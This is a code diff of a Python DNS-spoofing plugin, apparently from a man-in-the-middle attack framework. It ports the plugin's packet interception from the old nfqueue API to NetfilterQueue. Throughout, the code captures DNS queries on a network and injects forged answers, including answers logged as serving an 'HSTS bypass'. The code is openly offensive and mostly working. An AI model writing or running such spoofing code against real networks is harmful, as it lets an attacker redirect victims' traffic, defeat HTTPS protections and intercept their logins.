@@ -2,14 +2,10 @@
 # DNS tampering code stolen from https://github.com/DanMcInerney/dnsspoof
 #
 
-#from twisted.internet import reactor
-#from twisted.internet.interfaces import IReadDescriptor
 from plugins.plugin import Plugin
 from time import sleep
 import dns.resolver
-#import socket
 from netfilterqueue import NetfilterQueue
-#import nfqueue
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
@@ -381,7 +377,7 @@ class _DNS():
 		t.start()
 
 	def nfqueue_bind(self):
-		self.nfqueue.bind(1, self.nfqueue_callback, 5000, 3)
+		self.nfqueue.bind(1, self.nfqueue_callback, 3)
 		self.nfqueue.run()
 
 	def stop(self):
@@ -405,14 +401,11 @@ class _DNS():
 			logging.info("Error resolving " + domain)
 
 	def nfqueue_callback(self, payload):
-		if payload:
-			print "got packet!"
-		data = payload.get_payload()
-		pkt = IP(data)
+		pkt = IP(payload.get_payload())
 		if not pkt.haslayer(DNSQR):
 			payload.accept()
 		else:
-			logging.debug("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
+			logging.info("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
 			if self.dns:
 				for k, v in self.dnscfg.items():
 					if k in pkt[DNSQR].qname:
@@ -446,9 +439,11 @@ class _DNS():
 			for i in ip:
 				spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
 			logging.info("%s Resolving %s for HSTS bypass" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
-			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
+			payload.set_payload(str(spoofed_pkt))
+			payload.accept()
 
 		if self.dns:
 			spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
 			logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
-			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
+			payload.set_payload(str(spoofed_pkt))
+			payload.accept()
